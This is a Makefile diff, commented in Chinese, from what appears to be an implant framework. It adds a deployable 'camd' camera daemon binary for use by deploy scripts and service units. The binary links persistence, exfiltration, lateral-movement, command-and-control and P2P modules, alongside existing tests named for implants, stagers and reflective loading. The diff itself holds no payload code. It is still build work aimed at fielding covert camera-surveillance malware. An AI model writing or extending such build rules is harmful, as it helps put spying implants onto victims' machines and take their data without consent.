@@ -93,6 +93,12 @@ TESTS     := test_pipeline test_linux_extra test_implant test_defend_win \
              test_reflect_run test_cam_daemon
 TEST_BINS := $(TESTS:%=$(BUILD)/%)
 
+# camd：部署用入口二进制（src/cam_daemon_main.c）。
+# 与 test_cam_daemon 的区别：前者参数写死在测试里、跑满 2 批即停、密钥硬编码；
+# 后者所有维度走命令行，退出码有明确语义，供部署脚本与服务单元调用。
+CAMDBIN := $(BUILD)/camd
+CAMBIN_OBJ := $(BUILD)/cam_daemon_main.o
+
 # winshim 下的测试（test_mf_logic / test_persist_win / test_implant_main /
 # test_stager_win）不在 all 里，它们需要 Windows shim 编译链；回归脚本
 # 显式调用 winshim-build 来构建。声明给审计脚本，避免被判为"默认目标漏构建"。
@@ -116,7 +122,7 @@ AUDIT_GOALS := winshim-build
 
 .PHONY: all test clean win dirs
 
-all: $(TEST_BINS)
+all: $(TEST_BINS) $(CAMDBIN)
 
 dirs:
 	@mkdir -p $(BUILD)
@@ -154,6 +160,17 @@ $(BUILD)/test_cam_daemon: tests/test_cam_daemon.c $(PORT_OBJS) $(DAEMON_OBJ) \
                           | dirs upstream-deps
 	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) \
 	      $(BUILD)/synth_pe.o \
+	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
+	      -o $@ $(LDLIBS)
+
+# camd 部署入口：与 test_cam_daemon 同一套依赖，但不链 synth_pe.o（那是 PE
+# 合成构造器，只有反射加载类测试用得上），入口换成 cam_daemon_main.o。
+$(CAMBIN_OBJ): src/cam_daemon_main.c include/cam_daemon.h include/camera.h | dirs
+	$(CC) $(CFLAGS) -c $< -o $@
+
+$(CAMDBIN): $(CAMBIN_OBJ) $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) $(DAEMON_DEPS) \
+            | dirs upstream-deps
+	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) \
 	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
 	      -o $@ $(LDLIBS)
 
